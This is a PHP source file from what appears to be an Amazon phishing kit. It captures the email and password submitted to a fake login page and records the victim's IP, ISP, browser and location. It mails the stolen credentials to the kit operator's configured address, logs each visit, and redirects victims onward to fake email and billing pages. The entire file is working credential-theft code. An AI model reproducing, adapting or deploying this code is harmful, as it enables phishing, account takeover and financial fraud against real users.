<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Jakarta');
$tanggal = date("d/m/Y H:i:s");
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
if($_POST['emailLogin'] == "") {
	exit();
}
$ip = getUserIP();
$ispuser = getisp($ip);
$ip = getUserIP();
$message  = "____ $$ If money not sleep, We cant rest $$ ____\n";
$message .= "\n";
$message .= "Email		: ".$_POST['emailLogin']."\n";
$message .= "Password	: ".$_POST['passwordLogin']."\n";
$message .= "\n";
$message .= "\n";
$message .= "Time		: ".$tanggal."\n";
$message .= "Browser		: ".$br.", ".$os.",".$user_agent."\n";
$message .= "Location		: ".$regioncity.", ".$citykota.", ".$countryname."\n";
$message .= "\n";
$message .= "_____ [ Teishutsu shite kurete arigatō! ] _____ \n";

$_SESSION['email'] = $_POST['emailLogin'];
$_SESSION['password'] = $_POST['passwordLogin'];
if($setting['send_login'] == 'on') {
  $subject = "AMAZON : ".$_POST['user']." [ $cn - $os - $ip ]";
  kirim_mail($setting['email_result'], "Login", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Amazon");
if($setting['get_email'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/email?session=$key';</script>";
exit();
}else{
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
}
?>
